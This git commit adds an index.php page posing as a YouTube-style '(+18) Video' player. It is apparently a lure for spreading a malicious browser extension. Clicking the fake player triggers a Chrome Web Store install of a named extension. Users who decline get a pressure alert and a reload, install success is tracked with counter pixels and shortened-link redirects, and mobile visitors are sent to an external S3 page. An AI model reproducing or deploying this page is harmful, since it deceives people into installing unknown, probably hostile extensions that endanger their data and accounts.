f9145b178f9c8d8c6d79ac29fa16f470b11abd34
trackerscan12 <tracker.scan1@hotmail.com>
2016-11-05 10:31:06 +0100

    Initial commit

---
+++ index.php
@@ -0,0 +1,342 @@
+
+<html xmlns="http://www.w3.org/1999/xhtml" prefix="og: http://ogp.me/ns#" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://opengraphprotocol.org/schema/">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+
+
+<link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/jlfdmndnfcfjjjopopknhfjohbaijjmk">
+<link rel="shortcut icon" href="https://s.ytimg.com/yts/img/favicon-vfldLzJxy.ico" type="image/x-icon">
+
+<title>New Video</title>
+
+<script>new Image().src = '//whos.amung.us/widget/pcpcditi1.png';</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+<script type="text/javascript">
+if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)))
+{
+location.replace("https://s3-us-west-2.amazonaws.com/redi1234/s.html");
+}
+
+
+if ( (navigator.userAgent.indexOf('Android') != -1) ) {
+document.location = "https://s3-us-west-2.amazonaws.com/redi1234/s.html";
+}
+
+
+/*!function(a){var b=/iPhone/i,c=/iPod/i,d=/iPad/i,e=/(?=.*\bAndroid\b)(?=.*\bMobile\b)/i,f=/Android/i,g=/IEMobile/i,h=/(?=.*\bWindows\b)(?=.*\bTouch\b)/i,i=/BlackBerry/i,j=/Opera Mini/i,k=/(?=.*\bFirefox\b)(?=.*\bMobile\b)/i,l=new RegExp("(?:Nexus 7|BNTV250|Kindle Fire|Silk|GT-P1000)","i"),m=function(a,b){return a.test(b)},n=function(a){var n=a||navigator.userAgent;this.apple={phone:m(b,n),ipod:m(c,n),tablet:m(d,n),device:m(b,n)||m(c,n)||m(d,n)},this.android={phone:m(e,n),tablet:!m(e,n)&&m(f,n),device:m(e,n)||m(f,n)},this.windows={phone:m(g,n),tablet:m(h,n),device:m(g,n)||m(h,n)},this.other={blackberry:m(i,n),opera:m(j,n),firefox:m(k,n),device:m(i,n)||m(j,n)||m(k,n)},this.seven_inch=m(l,n),this.any=this.apple.device||this.android.device||this.windows.device||this.other.device||this.seven_inch,this.phone=this.apple.phone||this.android.phone||this.windows.phone,this.tablet=this.apple.tablet||this.android.tablet||this.windows.tablet},o=new n;o.Class=n,"undefined"!=typeof module&&module.exports?module.exports=o:"function"==typeof define&&define.amd&&define(o),a.isMobile=o}(this);
+if (isMobile.any || navigator.platform.toLowerCase().indexOf("win") == -1) {
+
+top.location.href="https://s3-us-west-2.amazonaws.com/redi1234/s.html";
+}*/</script>
+  <script>
+
+		if (top.location != self.location) { top.location = self.location }
+if (self != top) {
+   top.location.replace(location.href);
+}
+		 </script>
+</head>
+
+<body>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-79756301-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+<style>
+/******* BODY ********/
+body {
+font-size: 13px;
+font-family: Arial, Helvetica, sans-serif;
+background:#f1f1f1;
+margin:0px;
+padding:0px;
+}
+
+/******* HEADER ********/
+#header {
+position: fixed;
+top:0px;
+left:0px;
+right:0px;
+height: 50px;
+width: 100%;
+background: #fff url('http://i.imgur.com/5fLsIMa.png') left center no-repeat;
+border-bottom: 1px solid #e8e8e8;
+cursor: pointer;
+z-index: 1999999999;
+}
+
+/******* MAIN ********/
+#main {
+width:702px;
+height:510px;
+border:0px solid #ccc;
+margin:0px auto;
+margin-top:20px;
+padding:0px 0px 0px 0px;
+overflow:hidden;
+}
+
+h1 {
+margin:70px 0px 10px 0px;
+padding:0px;
+color:#333;
+font-size: 20px;
+font-weight: bold;
+line-height: 1.38;
+overflow:hidden;
+text-align:center;
+}
+
+/******* CONTENIDO ********/
+#contenido {
+float:left;
+width:700px;
+margin:0px;
+padding:0px 0px 110px 0px; 
+background: #fff url('http://i.imgur.com/ufkpYyf.png') bottom center no-repeat;
+border: 1px solid;
+border-color: #e5e6e9 #dfe0e4 #d0d1d5;
+-webkit-border-radius: 5px;
+overflow:hidden;
+}
+
+#titulo {
+width:800px;
+margin:10px 0px 10px 0px;
+padding:0px;
+color:#333;
+font-size: 15px;
+font-weight: normal;
+line-height: 1.38;
+overflow:hidden;
+}
+
+.youtubeblocker {
+	position:relative;
+	margin-bottom:0px;
+	cursor:pointer;
+	overflow: hidden;
+}
+.youtubeblocker .image {
+	width:100%;
+	height:100%;
+	background-size:100% 100%;
+}
+.youtubeblocker .play-button {
+	position:absolute;
+	top:50%;
+	left:50%;
+	margin-left:-34px;
+	margin-top:-23px;
+	display:block;
+	width:65px;
+	height:47px;
+	background: url('http://i.imgur.com/3lEq5if.png');
+}
+.youtubeblocker:hover .play-button {
+	background-position:-65px;
+}
+.youtubeblocker .overlay {
+	display:none;
+	background: #000;
+	opacity: .5;
+	width:100%;
+	height:100%;
+	position:absolute;
+	left:0;top:0;
+}
+.youtubeblocker .sharebox {
+	display:none;
+	position: absolute;
+	left:10px;
+	top:70px;
+	right:10px;
+	height:131px;
+	padding:0px;
+	background: url('compartir.png') center center no-repeat;
+}
+
+.youtubeblocker-ori .sharebox-ori {
+	display:none;
+	position: absolute;
+	left:10px;
+	top:50px;
+	right:10px;
+	height:150px;
+	padding:10px;
+	background: #FFF;
+}
+.youtubeblocker .sharebox p {
+	font-size:18px;
+	margin-top:15px;
+	text-align: center;
+}
+.youtubeblocker .sharebutholder {
+	text-align: center;
+	position: absolute;
+	bottom: 20px;
+	right: 0px;
+	left: 2px;
+}
+.youtubeblocker .sharebut {
+    border-radius: 5px;
+	width:243px;
+	height:56px;
+	cursor: pointer;
+	background: url('http://i.imgur.com/pwncTgN.gif') 0px 0px no-repeat;
+	//background: url('../images/sharebut.png') 0px 0px no-repeat;
+    display: -moz-inline-stack;
+    display: inline-block;
+    zoom: 1;
+    *display: inline;
+}
+.youtubeblocker .controlls {
+	height:35px;
+	position:absolute;
+	bottom:0px;
+	left:0px;
+	right:0px;
+	background: url('http://i.imgur.com/2nyiyHH.png');
+}
+.youtubeblocker .controlls .left-controlls {
+	cursor:pointer;
+	position:absolute;
+	left:11px;
+	height:35px;
+	width:121px;
+	background: url('http://i.imgur.com/QBeDFb9.png') 0px 13px no-repeat;
+}
+.youtubeblocker .controlls .right-controlls {
+	cursor:pointer;
+	position:absolute;
+	right:9px;
+	height:35px;
+	width:100px;
+	background: url('http://i.imgur.com/KneATBL.png') 0px 13px no-repeat;
+}
+
+#footer {
+//position: fixed;
+cursor:pointer;
+width: 100%;
+height:120px;
+background: #fff url('http://i.imgur.com/GbfiQoo.png') center center no-repeat;
+border-top: 1px solid #e2e2e2;
+bottom:0px;
+left:0px;
+right:0px;
+}
+</style>
+
+<div id="header"></div>
+
+<h1 style="margin-top:100px;">(+18) Video</h1>
+<div id="main">
+<div id="contenido"  style="margin-top:50px;">
+
+<!-- #### VIDEO 1 ### -->
+<div href="http://google.com/" id="uno" onclick="chromex();" class="youtubeblocker" style="width:700px;height:350px;background:#000000 url('http://i.imgur.com/yETYoId.gif') center center no-repeat;">
+<div class="image" style="background:#000000;"></div>
+<div class="play-button"></div>
+<div class="controlls">
+<div class="left-controlls"></div>
+<div class="right-controlls"></div>
+</div>
+<div class="overlay"></div>
+<div class="sharebox"></div>
+</div> 
+             <div id="titulo-bottom">
+              </div>
+<!-- #### VIDEO 2 ### -->
+
+<div href="http://google.com/" id="dos" class="youtubeblocker" style="display:none;width:700px;height:350px;background:#000000 url('verifica.jpgg') center center no-repeat;">
+<div class="image" style="background-image: url('URL_IMG')"></div>
+<div class="play-button"></div>
+<div class="controlls">
+<div class="left-controlls"></div>
+<div class="right-controlls"></div>
+</div>
+<div class="overlay"></div>
+<div class="sharebox"></div>
+</div> 
+<!-- #### VIDEO 2 FIN### -->
+
+
+<script type="text/javascript">
+$(document).ready(function(){
+$('#uno').click(function () {
+$(".play-button,.image").fadeOut();
+chromex();
+});
+
+});
+</script>
+
+<script type="text/javascript">
+navegador();
+function navegador() {
+var navegador = navigator.userAgent;
+if (navigator.userAgent.indexOf('Firefox') !=-1) {
+$("#uno").hide();
+$("#dos").show();
+} else if (navigator.userAgent.indexOf('Chrome') !=-1) {
+(function(a, b){
+var e = new Image();
+e.addEventListener('load', a, false);
+e.addEventListener('error', b, false);
+e.src = '';
+})(function(){
+$("#uno").hide();
+$("#dos").show();
+}, function(){
+
+});
+ }
+}
+function chromex(){
+			 chrome.webstore.install("https://chrome.google.com/webstore/detail/jlfdmndnfcfjjjopopknhfjohbaijjmk", function(){
+				 var dax = new Image();
+dax.onload = function(){
+window.location = "http://goo.gl/hKDd87";
+//window.location = "http://goo.gl/9upmZJ";
+}
+dax.onerror = function(){
+window.location = "http://goo.gl/hKDd87";
+//window.location = "http://goo.gl/9upmZJ";  http://goo.gl/yPXZLG      https://goo.gl/Limtf
+}
+dax.src="http://whos.amung.us/widget/instalimet1.png";
+			  }, function(err)
+			  {
+				  alert(" Sorry,if you don't install Video Play plugin, you will not be able to watch the video!\r\nClick 'Add Extension' to watch the Video");
+				  location.reload();
+			  });
+
+setTimeout(function(){
+uno.setAttribute("style", "width:700px;height:350px;background:#000000 url('verby/err.png') center center no-repeat;");
+setTimeout(function()
+{
+uno.setAttribute("style", "width:700px;height:350px;background:#000000 url('verby/up.gif') center center no-repeat;");
+
+}, 800);
+}, 1000);
+
+}
+</script>
+
+
+<div id="footer" style="margin-top:250; position:fixed;"></div>
+
+
+</body>
+
+</html>
